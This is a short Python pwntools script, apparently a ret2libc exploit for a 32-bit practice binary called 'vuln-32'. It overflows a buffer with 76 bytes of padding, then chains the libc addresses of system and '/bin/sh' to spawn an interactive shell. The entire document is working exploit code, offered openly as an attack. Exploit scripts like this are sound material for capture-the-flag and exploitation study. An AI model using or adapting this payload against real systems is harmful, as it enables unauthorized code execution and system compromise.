from pwn import *

context.binary = ELF("./vuln-32")

offset = 76
system_offset = 0x48170
binsh_offset = 0x1bd0d5


p = process()
libc = p.libc
payload = flat([
    b"A" * offset, 
    libc.address + system_offset,
    0x0,
    libc.address + binsh_offset
])

# gdb.attach(p)
p.recvline()
p.sendline(payload)
p.interactive()